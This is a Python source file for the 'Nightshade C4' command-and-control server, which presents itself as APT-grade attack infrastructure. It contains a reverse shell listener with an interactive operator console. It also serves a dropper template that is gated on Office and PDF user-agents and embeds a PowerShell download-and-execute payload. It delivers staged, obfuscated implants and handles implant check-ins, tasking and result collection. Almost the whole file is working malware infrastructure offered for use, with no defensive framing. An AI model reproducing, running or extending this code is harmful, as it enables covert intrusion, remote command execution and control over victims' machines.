"""
Nightshade C2 Server -- HTTP staging server + reverse shell handler + admin API.
C4: Enhanced console with ANSI colors, live session display, interactive shell,
TLS support, task history export, and multi-stage protocol support.
"""
import os
import sys
import json
import time
import socket
import struct
import threading
import sqlite3
import base64
import uuid
import tempfile
from datetime import datetime, timezone
from typing import Optional
from collections import OrderedDict

from flask import Flask, request, send_file, jsonify, abort, Response

from ..core.crypto import NightshadeCrypto
from ..core.evasion import EvasionGenerator
from ..core.obfuscation import PSObfuscator
from ..payloads.stager import Stage0Generator, Stage1Generator, Stage2Generator
from .protocol import SessionManager, parse_message, build_checkin_payload

# ANSI color codes
class C:
    H = '\033[96m'    # Cyan header
    B = '\033[94m'    # Blue info
    G = '\033[92m'    # Green success
    Y = '\033[93m'    # Yellow warning
    R = '\033[91m'    # Red error
    M = '\033[95m'    # Magenta
    BD = '\033[1m'    # Bold
    DM = '\033[2m'    # Dim
    RS = '\033[0m'    # Reset
    CL = '\033[2K\r'  # Clear line

# ------------------------------------------------------------------ #
#  Flask app                                                           #
# ------------------------------------------------------------------ #
app = Flask(__name__)

CRYPTO: Optional[NightshadeCrypto] = None
MANAGER: SessionManager = SessionManager()
REVERSE_SHELL_PORT = 4444
_reverse_shell_server: Optional[socket.socket] = None
_server_running = threading.Event()
_interactive_mode = True
_active_shells: dict[str, dict] = {}

C2_BANNER = f"""
{C.H}{C.BD}
   ╔══════════════════════════════════════════════════════╗
   ║            NIGHTSHADE C4  C2  SERVER                 ║
   ║            APT-Grade Command & Control               ║
   ╚══════════════════════════════════════════════════════╝
{C.RS}
"""


# ------------------------------------------------------------------ #
#  Database                                                            #
# ------------------------------------------------------------------ #
DB_PATH = ""

def _get_db_path() -> str:
    base = os.path.dirname(os.path.abspath(__file__))
    db_dir = os.path.join(base, "..", "nightshade_data")
    os.makedirs(db_dir, exist_ok=True)
    return os.path.join(db_dir, "c2.db")


def _init_db():
    global DB_PATH
    DB_PATH = _get_db_path()
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.executescript("""
        CREATE TABLE IF NOT EXISTS requests (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            ip TEXT,
            user_agent TEXT,
            endpoint TEXT,
            status TEXT DEFAULT 'DELIVERED',
            request_type TEXT DEFAULT 'UNKNOWN'
        );
        CREATE TABLE IF NOT EXISTS sessions (
            session_id TEXT PRIMARY KEY,
            ip TEXT,
            hostname TEXT DEFAULT '',
            username TEXT DEFAULT '',
            first_seen TEXT,
            last_seen TEXT,
            checkin_count INTEGER DEFAULT 0,
            status TEXT DEFAULT 'active',
            metadata TEXT DEFAULT '{}'
        );
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT NOT NULL,
            command TEXT,
            timestamp TEXT NOT NULL,
            result TEXT,
            status TEXT DEFAULT 'pending'
        );
        CREATE TABLE IF NOT EXISTS stage_requests (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT,
            ip TEXT,
            stage INTEGER,
            timestamp TEXT
        );
    """)
    conn.commit()
    conn.close()


def _log_request(ip: str, ua: str, endpoint: str, status: str = "DELIVERED", rtype: str = "UNKNOWN"):
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT INTO requests (timestamp, ip, user_agent, endpoint, status, request_type) VALUES (?,?,?,?,?,?)",
            (datetime.now(timezone.utc).isoformat(), ip, ua, endpoint, status, rtype),
        )
        conn.commit()
        conn.close()
    except Exception:
        pass


def _log_session(sid: str, ip: str, hostname: str, username: str):
    try:
        conn = sqlite3.connect(DB_PATH)
        now = datetime.now(timezone.utc).isoformat()
        conn.execute(
            "INSERT OR REPLACE INTO sessions (session_id, ip, hostname, username, first_seen, last_seen, checkin_count) "
            "VALUES (?,?,?,?,COALESCE((SELECT first_seen FROM sessions WHERE session_id=?),?),"
            "COALESCE((SELECT checkin_count FROM sessions WHERE session_id=?)+1,1))",
            (sid, ip, hostname, username, sid, now, sid),
        )
        conn.commit()
        conn.close()
    except Exception:
        pass


def _log_cmd(session_id: str, command: str, result: str = "", status: str = "pending"):
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT INTO commands (session_id, command, timestamp, result, status) VALUES (?,?,?,?,?)",
            (session_id, command[:500], datetime.now(timezone.utc).isoformat(), result[:2000], status),
        )
        conn.commit()
        conn.close()
    except Exception:
        pass


def _get_task_history(session_id: Optional[str] = None, limit: int = 50) -> list[dict]:
    """Get task history with optional session filter."""
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.row_factory = sqlite3.Row
        if session_id:
            rows = conn.execute(
                "SELECT * FROM commands WHERE session_id=? ORDER BY id DESC LIMIT ?",
                (session_id, limit),
            ).fetchall()
        else:
            rows = conn.execute(
                "SELECT * FROM commands ORDER BY id DESC LIMIT ?", (limit,)
            ).fetchall()
        conn.close()
        return [dict(r) for r in rows]
    except Exception:
        return []


def _export_tasks_csv(session_id: Optional[str] = None) -> str:
    """Export task history as CSV."""
    tasks = _get_task_history(session_id, limit=10000)
    lines = ["id,session_id,command,timestamp,result,status"]
    for t in tasks:
        cmd_esc = t.get("command", "").replace('"', '""')
        res_esc = (t.get("result") or "").replace('"', '""')
        lines.append(f'{t["id"]},"{t["session_id"]}","{cmd_esc}","{t.get("timestamp")}","{res_esc}","{t.get("status")}"')
    return "\n".join(lines)


# ------------------------------------------------------------------ #
#  Reverse shell handler                                               #
# ------------------------------------------------------------------ #

def _reverse_shell_worker(client_socket, addr, session_id=""):
    """Interactive shell loop for a single reverse shell connection."""
    sid_display = session_id[:8] if session_id else f"{addr[0]}:{addr[1]}"
    print(f"\n{C.G}[+] Reverse shell session from {addr[0]}:{addr[1]} [{sid_display}]{C.RS}")

    if session_id:
        _active_shells[session_id] = {"socket": client_socket, "addr": addr}
        _log_session(session_id, addr[0], f"shell-{addr[0]}", "revshell")

    try:
        client_socket.settimeout(0.5)
        buf = b""
        while True:
            try:
                cmd_input = input(f" {C.H}nightshade[{sid_display}]>{C.RS} ").strip()
            except (EOFError, KeyboardInterrupt):
                break
            if not cmd_input:
                continue
            if cmd_input.lower() in ("exit", "quit", "background"):
                if cmd_input.lower() == "background":
                    print(f"{C.Y}[*] Backgrounding shell {sid_display}{C.RS}")
                    break
                client_socket.send(b"exit\n")
                break
            if cmd_input.lower() == "sessions":
                list_sessions_cli()
                continue
            if cmd_input.startswith("interact "):
                target_sid = cmd_input.split(" ", 1)[1]
                switch_to_shell(target_sid)
                continue
            if cmd_input.lower() == "help":
                print(f"\n{C.H}Commands:{C.RS}")
                print("  exit/quit     Close this shell")
                print("  background    Return to server console")
                print("  sessions      List all sessions")
                print("  interact <id> Switch to another shell session")
                print("  help          This menu")
                continue

            client_socket.send(cmd_input.encode() + b"\n")
            output = b""
            start = time.time()
            while time.time() - start < 3.0:
                try:
                    chunk = client_socket.recv(4096)
                    if not chunk:
                        break
                    output += chunk
                except socket.timeout:
                    break
                except OSError:
                    break

            if output:
                try:
                    text = output.decode("utf-8", errors="replace")
                    print(text.rstrip())
                except Exception:
                    print(f"[raw] {output[:200]}")
    except Exception as e:
        print(f"\n{C.R}[-] Shell error: {e}{C.RS}")
    finally:
        client_socket.close()
        if session_id and session_id in _active_shells:
            del _active_shells[session_id]
        print(f"{C.Y}[-] Session {sid_display} closed.{C.RS}")


def switch_to_shell(session_id: str):
    """Switch to an active shell session."""
    if session_id in _active_shells:
        shell = _active_shells[session_id]
        sock = shell["socket"]
        addr = shell["addr"]
        t = threading.Thread(target=_reverse_shell_worker, args=(sock, addr, session_id), daemon=True)
        t.start()
        t.join(timeout=0.1)
    else:
        print(f"{C.R}[-] No active shell with ID: {session_id}{C.RS}")


def _reverse_shell_listener():
    """Background thread -- listen for inbound reverse shells."""
    global _reverse_shell_server
    _reverse_shell_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    _reverse_shell_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    _reverse_shell_server.settimeout(1.0)
    try:
        _reverse_shell_server.bind(("0.0.0.0", REVERSE_SHELL_PORT))
        _reverse_shell_server.listen(20)
        _reverse_shell_server.settimeout(1.0)
        print(f" {C.G}[+] Reverse shell listener on 0.0.0.0:{REVERSE_SHELL_PORT}{C.RS}")
    except OSError as e:
        print(f" {C.R}[-] Reverse shell listener failed on port {REVERSE_SHELL_PORT}: {e}{C.RS}")
        return

    while _server_running.is_set():
        try:
            client, addr = _reverse_shell_server.accept()
            t = threading.Thread(target=_reverse_shell_worker, args=(client, addr), daemon=True)
            t.start()
        except socket.timeout:
            continue
        except OSError:
            break


def start_reverse_shell_handler():
    t = threading.Thread(target=_reverse_shell_listener, daemon=True)
    t.start()


def list_sessions_cli():
    """Print session list to console."""
    sessions = MANAGER.list_sessions()
    if not sessions:
        print(f"{C.Y}[!] No active sessions.{C.RS}")
        return

    print(f"\n{C.H}{C.BD}{'ID':<40} {'IP':<18} {'Hostname':<20} {'User':<15} {'Checkins':<10} {'Last Seen':<20}{C.RS}")
    print(f"{C.DM}{'-'*120}{C.RS}")
    for s in sessions:
        sid = s.get("session_id", "?")[:36]
        hostname = s.get("hostname", "-")[:18]
        username = s.get("username", "-")[:14]
        count = str(s.get("checkin_count", 0))
        last = s.get("last_seen", "-")[:18]
        ip = s.get("ip", "?")
        print(f" {sid:<38} {ip:<18} {hostname:<20} {username:<15} {count:<10} {last:<20}")


# ------------------------------------------------------------------ #
#  Routes -- Staging                                                   #
# ------------------------------------------------------------------ #

@app.route("/template.ole")
def serve_template():
    ip = request.remote_addr or "0.0.0.0"
    ua = request.headers.get("User-Agent", "")
    ua_lower = ua.lower()

    is_office = any(x in ua_lower for x in ["excel", "microsoft", "office", "msoffice", "ms-office"])
    is_pdf = any(x in ua_lower for x in ["adobe", "acrobat", "reader", "pdf"])
    is_hta = any(x in ua_lower for x in ["msie", "trident", "windows-rss", "msapp"])

    if not is_office and not is_pdf and not is_hta:
        _log_request(ip, ua, "/template.ole", "BLOCKED", "UNKNOWN")
        abort(404)

    rtype = "PDF" if is_pdf else "Excel" if is_office else "HTA"
    c2_url = request.host_url.rstrip("/")

    payload = f"""
$url='{c2_url}/template.ole'
try {{
    $d=(New-Object Net.WebClient).DownloadString($url)
    iex $d
}} catch {{
    try {{
        $d=Invoke-WebRequest $url -UseBasicParsing
        iex $d.Content
    }} catch {{}}
}}
"""

    encrypted = CRYPTO.encrypt(payload) if CRYPTO else payload

    template_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<Objects xmlns="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
    <Object ProgID="Nightshade.Implant.4" Version="4.0">
        <Payload>{encrypted}</Payload>
        <Activationcondition>TRUE</Activationcondition>
        <TargetApp>{'Adobe Reader' if is_pdf else 'Microsoft Office'}</TargetApp>
    </Object>
</Objects>"""

    tmp = tempfile.NamedTemporaryFile(mode="w", suffix=".ole", delete=False)
    tmp.write(template_xml)
    tmp.close()

    _log_request(ip, ua, "/template.ole", "DELIVERED", rtype)
    print(f" {C.G}[+] Served {rtype} template -> {ip}{C.RS}")

    resp = send_file(tmp.name, as_attachment=True, download_name=f"{rtype.lower()}_template.ole")
    @resp.call_on_close
    def _clean():
        try:
            os.unlink(tmp.name)
        except OSError:
            pass
    return resp


@app.route("/stage0/<session_id>")
def serve_stage0(session_id):
    """Serve Stage 0 beacon stub."""
    ip = request.remote_addr or "0.0.0.0"
    c2_url = request.host_url.rstrip("/")

    _log_request(ip, request.headers.get("User-Agent", ""), f"/stage0/{session_id[:8]}..", "DELIVERED", "STAGE0")
    _log_stage(session_id, ip, 0)
    print(f" {C.B}[*] Stage 0 served -> {ip} [{session_id[:8]}..]{C.RS}")

    stage0 = Stage0Generator.generate(c2_url, session_id)
    return Response(stage0, mimetype="text/plain")


@app.route("/stage1/<session_id>")
def serve_stage1(session_id):
    """Serve Stage 1 (evasion preamble + stage 2 download)."""
    ip = request.remote_addr or "0.0.0.0"
    c2_url = request.host_url.rstrip("/")

    _log_request(ip, request.headers.get("User-Agent", ""), f"/stage1/{session_id[:8]}..", "DELIVERED", "STAGE1")
    _log_stage(session_id, ip, 1)
    print(f" {C.B}[*] Stage 1 served -> {ip} [{session_id[:8]}..]{C.RS}")

    stage1 = Stage1Generator.generate(c2_url, session_id)
    return Response(stage1, mimetype="text/plain")


@app.route("/stage2/<session_id>")
def serve_stage2(session_id):
    """Serve Stage 2 (actual implant payload)."""
    ip = request.remote_addr or "0.0.0.0"
    c2_url = request.host_url.rstrip("/")

    _log_request(ip, request.headers.get("User-Agent", ""), f"/stage2/{session_id[:8]}..", "DELIVERED", "STAGE2")
    _log_stage(session_id, ip, 2)
    print(f" {C.Y}[*] Stage 2 served -> {ip} [{session_id[:8]}..]{C.RS}")

    stage2 = Stage2Generator.obfuscated_stage2(tier=2, c2_url=c2_url, session_id=session_id)
    return Response(stage2, mimetype="text/plain")


def _log_stage(session_id: str, ip: str, stage: int):
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.execute(
            "INSERT INTO stage_requests (session_id, ip, stage, timestamp) VALUES (?,?,?,?)",
            (session_id, ip, stage, datetime.now(timezone.utc).isoformat()),
        )
        conn.commit()
        conn.close()
    except Exception:
        pass


# ------------------------------------------------------------------ #
#  Routes -- C2                                                        #
# ------------------------------------------------------------------ #

@app.route("/c2/checkin", methods=["POST"])
def c2_checkin():
    session_id = request.headers.get("X-Session-ID")
    if not session_id:
        return jsonify({"error": "no session"}), 400

    ip = request.remote_addr or "0.0.0.0"
    data = request.get_data(as_text=True)

    msg = parse_message(CRYPTO, data) if CRYPTO else None
    checkin_count = msg.get("seq", 0) if msg else 0

    session = MANAGER.register_session(session_id, ip)

    if msg:
        hostname = msg.get("hostname", "")
        username = msg.get("username", "")
        if hostname:
            MANAGER.update_session_metadata(session_id, hostname=hostname, username=username)
            _log_session(session_id, ip, hostname, username)
            print(f" {C.G}[+] Checkin: {hostname}\\{username} [{session_id[:8]}..] ({checkin_count}){C.RS}")
        else:
            print(f" {C.G}[+] Checkin: {ip} [{session_id[:8]}..] ({checkin_count}){C.RS}")

    task = MANAGER.pop_task(session_id)
    if task:
        reply = CRYPTO.encrypt(json.dumps({"type": "task", "task_id": task.task_id, "command": task.command}))
    else:
        reply = CRYPTO.encrypt(json.dumps({"type": "noop"})) if CRYPTO else "noop"

    return reply, 200, {"Content-Type": "text/plain"}


@app.route("/c2/result", methods=["POST"])
def c2_result():
    session_id = request.headers.get("X-Session-ID")
    if not session_id:
        return jsonify({"error": "no session"}), 400

    data = request.get_data(as_text=True)
    msg = parse_message(CRYPTO, data) if CRYPTO else None

    if msg and msg.get("type") == "result":
        task_id = msg.get("task_id", "unknown")
        result = msg.get("result", "")
        status = msg.get("status", "success")
        MANAGER.complete_task(session_id, result)
        _log_cmd(session_id, f"task:{task_id[:16]}", result[:200], status)
        print(f" {C.Y}[+] Result [{session_id[:8]}../{task_id[:8]}]: {result[:100]}{C.RS}")
        return jsonify({"status": "ok"})

    return jsonify({"error": "invalid"}), 400


@app.route("/c2/command", methods=["POST"])
def submit_command():
    data = request.get_json(silent=True) or {}
    session_id = data.get("session_id", "")
    command = data.get("command", "")

    if not session_id or not command:
        return jsonify({"error": "session_id and command required"}), 400

    task_id = MANAGER.enqueue_task(session_id, command)
    _log_cmd(session_id, command, "queued", "pending")
    print(f" {C.B}[+] Task queued [{session_id[:8]}..]: {command}{C.RS}")
    return jsonify({"task_id": task_id, "status": "queued"})


@app.route("/c2/sessions")
def list_sessions():
    return jsonify({"sessions": MANAGER.list_sessions()})


@app.route("/c2/tasks")
def list_tasks():
    session_id = request.args.get("session_id", None)
    return jsonify({"tasks": MANAGER.list_tasks(session_id)})


@app.route("/c2/history")
def get_history():
    session_id = request.args.get("session_id", None)
    format_type = request.args.get("format", "json")

    if format_type == "csv":
        csv_data = _export_tasks_csv(session_id)
        return Response(
            csv_data,
            mimetype="text/csv",
            headers={"Content-Disposition": "attachment; filename=nightshade_task_history.csv"},
        )

    return jsonify({"tasks": _get_task_history(session_id)})


@app.route("/admin/stats")
def admin_stats():
    return jsonify(MANAGER.get_stats())


# ------------------------------------------------------------------ #
#  Console command handler                                              #
# ------------------------------------------------------------------ #

def _console_handler():
    """Background thread that handles console input while server runs."""
    while _server_running.is_set():
        try:
            cmd = input(f"\n {C.H}nightshade>{C.RS} ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            _server_running.clear()
            break

        if not cmd:
            continue

        parts = cmd.split()
        action = parts[0].lower()

        if action == "help":
            print(f"\n{C.H}{C.BD}Nightshade C4 Console Commands:{C.RS}")
            print(f"  {C.B}sessions{C.RS}        List all sessions")
            print(f"  {C.B}interact <id>{C.RS}   Open interactive shell with session")
            print(f"  {C.B}cmd <id> <c>{C.RS}    Send command to session")
            print(f"  {C.B}history [id]{C.RS}    Show task history (optional session filter)")
            print(f"  {C.B}export [id]{C.RS}     Export task history as CSV")
            print(f"  {C.B}stats{C.RS}           Show server statistics")
            print(f"  {C.B}clear{C.RS}           Clear screen")
            print(f"  {C.B}quit{C.RS}            Shutdown server")
            print()

        elif action == "sessions":
            list_sessions_cli()

        elif action == "interact" and len(parts) >= 2:
            target_sid = parts[1]
            switch_to_shell(target_sid)

        elif action == "cmd" and len(parts) >= 3:
            target_sid = parts[1]
            command = " ".join(parts[2:])
            task_id = MANAGER.enqueue_task(target_sid, command)
            _log_cmd(target_sid, command, "queued", "pending")
            print(f" {C.G}[+] Command queued [{target_sid[:8]}..]: {command}{C.RS}")
            print(f" {C.DM}    Task ID: {task_id}{C.RS}")

        elif action == "history":
            sid = parts[1] if len(parts) >= 2 else None
            tasks = _get_task_history(sid, limit=20)
            if not tasks:
                print(f"{C.Y}[!] No task history.{C.RS}")
            else:
                print(f"\n{C.H}{C.BD}{'ID':<6} {'Session':<20} {'Command':<40} {'Status':<12} {'Result':<40}{C.RS}")
                print(f"{C.DM}{'-'*120}{C.RS}")
                for t in tasks:
                    cmd_short = (t.get("command") or "")[:38]
                    res_short = (t.get("result") or "-")[:38]
                    sid_short = t.get("session_id", "?")[:18]
                    status = t.get("status", "?")
                    print(f" {t['id']:<4} {sid_short:<20} {cmd_short:<40} {status:<12} {res_short:<40}")

        elif action == "export":
            sid = parts[1] if len(parts) >= 2 else None
            csv_data = _export_tasks_csv(sid)
            export_path = f"nightshade_export_{int(time.time())}.csv"
            with open(export_path, "w") as f:
                f.write(csv_data)
            print(f" {C.G}[+] Exported to {export_path}{C.RS}")

        elif action == "stats":
            stats = MANAGER.get_stats()
            print(f"\n{C.H}{C.BD}Server Statistics:{C.RS}")
            for k, v in stats.items():
                print(f"  {C.B}{k}:{C.RS} {v}")

        elif action == "clear":
            os.system("clear" if os.name == "posix" else "cls")

        elif action == "quit":
            print(f"{C.Y}[-] Shutting down...{C.RS}")
            _server_running.clear()

        else:
            print(f"{C.R}Unknown command: {action}. Type 'help' for commands.{C.RS}")


# ------------------------------------------------------------------ #
#  Server launch                                                        #
# ------------------------------------------------------------------ #

def run_server(
    host: str = "0.0.0.0",
    port: int = 8080,
    crypto: Optional[NightshadeCrypto] = None,
    tls: bool = False,
    cert_path: str = "",
    key_path: str = "",
):
    global CRYPTO
    CRYPTO = crypto
    _init_db()
    start_reverse_shell_handler()

    protocol = "https" if tls else "http"
    _server_running.set()

    print(C2_BANNER)
    print(f" {C.H}{C.BD}Server Configuration:{C.RS}")
    print(f"   Staging + C2 : {protocol}://{host}:{port}")
    print(f"   Reverse shell: 0.0.0.0:{REVERSE_SHELL_PORT}")
    print(f"   Encryption   : AES-256-GCM")
    print(f"   TLS          : {'Enabled' if tls else 'Disabled'}")
    if tls:
        print(f"   Cert         : {cert_path}")
        print(f"   Key          : {key_path}")
    print()
    print(f" {C.H}{C.BD}Endpoints:{C.RS}")
    print(f"   {C.B}/template.ole{C.RS}     -- Serve dropper template")
    print(f"   {C.B}/stage0/<id>{C.RS}      -- Stage 0 beacon stub")
    print(f"   {C.B}/stage1/<id>{C.RS}      -- Stage 1 evasion preamble")
    print(f"   {C.B}/stage2/<id>{C.RS}      -- Stage 2 implant payload")
    print(f"   {C.B}/c2/checkin{C.RS}       -- Implant beacon")
    print(f"   {C.B}/c2/result{C.RS}        -- Task result callback")
    print(f"   {C.B}/c2/command{C.RS}       -- Submit command to session")
    print(f"   {C.B}/c2/sessions{C.RS}      -- List active sessions")
    print(f"   {C.B}/c2/tasks{C.RS}         -- View task queue")
    print(f"   {C.B}/c2/history{C.RS}       -- Task history (export as CSV)")
    print(f"   {C.B}/admin/stats{C.RS}      -- Server statistics")
    print()
    print(f" {C.H}{C.BD}Console Commands:{C.RS}")
    print(f"   Type {C.B}sessions{C.RS}, {C.B}cmd <id> <command>{C.RS}, {C.B}interact <id>{C.RS}")
    print(f"   {C.B}history{C.RS}, {C.B}export{C.RS}, {C.B}stats{C.RS}, {C.B}help{C.RS}, {C.B}quit{C.RS}")
    print()

    # Start console handler in a thread
    console_thread = threading.Thread(target=_console_handler, daemon=True)
    console_thread.start()

    ssl_context = None
    if tls and cert_path and key_path:
        ssl_context = (cert_path, key_path)

    try:
        app.run(
            host=host,
            port=port,
            debug=False,
            use_reloader=False,
            ssl_context=ssl_context,
        )
    except KeyboardInterrupt:
        pass
    finally:
        _server_running.clear()
        if _reverse_shell_server:
            try:
                _reverse_shell_server.close()
            except OSError:
                pass
        print(f"\n{C.Y}[-] C2 Server stopped.{C.RS}")
